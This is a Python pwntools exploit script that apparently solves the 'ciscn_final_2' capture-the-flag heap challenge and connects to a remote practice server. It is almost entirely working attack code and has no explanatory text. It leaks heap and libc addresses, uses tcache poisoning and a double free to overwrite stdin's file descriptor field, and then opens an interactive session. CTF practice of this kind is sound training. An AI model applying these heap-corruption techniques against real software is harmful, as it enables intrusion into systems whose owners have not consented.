from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv
from subprocess import check_output

s = lambda data: p.send(str(data))
sa = lambda delim,data: p.sendafter(delim,str(data))
sl = lambda data: p.sendline(str(data))
sla = lambda delim,data: p.sendlineafter(delim,str(data))
r = lambda num=4096: p.recv(num)
ru = lambda delims,drop=True: p.recvuntil(delims,drop)
uu64 = lambda data: u64(data.ljust(8,'\0'))
leak = lambda name,addr: log.success('{} = {:#x}'.format(name, addr))

def leak_libc(func,addr,elf=None):
	if elf:
		libc = elf
		base = addr-libc.sym[func]
		leak('base',base)
		system = base+libc.sym['system']
	else:
		libc = LibcSearcher(func,addr)
		base = addr-libc.dump(func)
		leak('base',base)
		system = base+libc.dump('system')

	return (base,libc,system)

context.log_level = 'DEBUG'
binary = './ciscn_final_2'
context.binary = binary
elf = ELF(binary,checksec=False)
#libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
libc_path = './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'
#env={'LD_PRELOAD':libc_path}
libc = ELF(libc_path,checksec=False)
one = map(int, check_output(['one_gadget','--raw',libc_path]).split(' '))
p = remote('node3.buuoj.cn',27657) if argv[1]=='r' else process(binary,env={'LD_PRELOAD':libc_path})

def dbg():
	gdb.attach(p)
	pause()

_add,_free,_edit,_show = 1,2,4,3
def add(type,content):
	sla('>',_add)
	sla('>',type)
	sla(':',content)

def free(type):
	sla('>',_free)
	sla('>',type)

def edit(index,content):
	sla('choice :',_edit)
	sla(':',index)
	sa(':',content)

def show(type):
	sla('>',_show)
	sla(':',type)

# start
add(1,0x30)
free(1)
add(2,0x20)
add(2,0x20)
add(2,0x20) # total size: 0x90
add(2,0x20) # prevent merging
free(2)
add(1,0x30)
free(2)
show(2)
ru('number :')
chunk0 = int(ru('\n'))-0xa0
leak('chunk0',chunk0)
add(2,chunk0) # poisoning
add(2,0xdeadbeef)
add(2,0x91) # chunk0

for i in range(7): # fill tcache
	free(1)
	add(2,0x20)
free(1) # unsorted
show(1)
ru('number :')

base = int(ru('\n'))-96-libc.sym['__malloc_hook']-0x10
leak('base',base)
fileno = base+libc.sym['_IO_2_1_stdin_']+0x70

add(1,fileno) # poisoning
add(1,0x30)
free(1)
add(2,0x20)
free(1)
show(1)
ru('number :')
chunk0_mem = int(ru('\n'))-0x30

add(1,chunk0_mem) # poisoning
add(1,0xdeadbeef)
add(1,0xdeadbeef)
add(1,666)

sla('>',4)
# end

p.interactive()